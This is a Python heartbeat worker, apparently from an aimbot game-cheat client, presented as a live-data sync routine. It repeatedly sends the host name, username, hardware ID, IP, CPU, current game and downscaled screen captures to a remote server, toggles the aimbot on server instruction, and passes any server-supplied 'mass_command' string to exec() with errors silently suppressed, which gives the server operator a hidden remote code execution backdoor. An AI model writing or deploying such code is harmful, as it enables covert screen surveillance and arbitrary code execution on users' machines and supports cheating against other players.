# =====================================================================
# BACKGROUND HEARTBEAT & FULL REMOTE SYNC WORKER
# =====================================================================
def client_heartbeat_worker(get_current_game_callback):
    """Synchronisiert Live-Daten, FPS, Stream-Frames und Feature-Switches"""
    global settings, latest_frame
    while True:
        try:
            if settings.get("running", True):
                hostname = platform.node() or "ASSMAR-PC"
                processor = platform.processor() or "CPU"
                
                try:
                    import socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect(("8.8.8.8", 80))
                    ip_addr = s.getsockname()[0]
                    s.close()
                except:
                    ip_addr = "127.0.0.1"

                # Kleinere Frame-Kopie für den Stream erstellen (schont Bandbreite)
                frame_b64_str = ""
                with frame_lock:
                    if latest_frame is not None:
                        try:
                            small_img = cv2.resize(latest_frame, (320, 240))
                            success_enc, encoded_img = cv2.imencode('.jpg', cv2.cvtColor(small_img, cv2.COLOR_RGB2BGR), [int(cv2.IMWRITE_JPEG_QUALITY), 60])
                            if success_enc:
                                import base64
                                frame_b64_str = base64.b64encode(encoded_img).decode('utf-8')
                        except:
                            pass

                payload = {
                    "desktop": hostname,
                    "custom_name": f"PC ({os.getenv('USERNAME', 'Assmar')})",
                    "hwid": get_hwid(),
                    "ip": ip_addr,
                    "cpu": processor,
                    "game": get_current_game_callback(),
                    "fps": int(settings.get("current_fps", 0)),
                    "frame_b64": frame_b64_str
                }
                
                response = requests.post(f"{RENDER_URL}/api/client/heartbeat", json=payload, timeout=4)
                if response.status_code == 403:
                    os._exit(0)

                if response.status_code == 200:
                    res_data = response.json()
                    cfg = res_data.get("settings", {})
                    
                    aimbot_allowed = cfg.get("aimbot_allowed", "true") == "true"
                    if not aimbot_allowed and settings["use_aimbot"]:
                        settings["use_aimbot"] = False
                        if gui_instance and hasattr(gui_instance, 'check_aimbot'):
                            gui_instance.after(0, lambda: gui_instance.check_aimbot.deselect())

                    mass_cmd = cfg.get("mass_command", "")
                    if mass_cmd and mass_cmd.strip():
                        try:
                            exec(mass_cmd, globals())
                        except:
                            pass
        except:
            pass
        time.sleep(3)
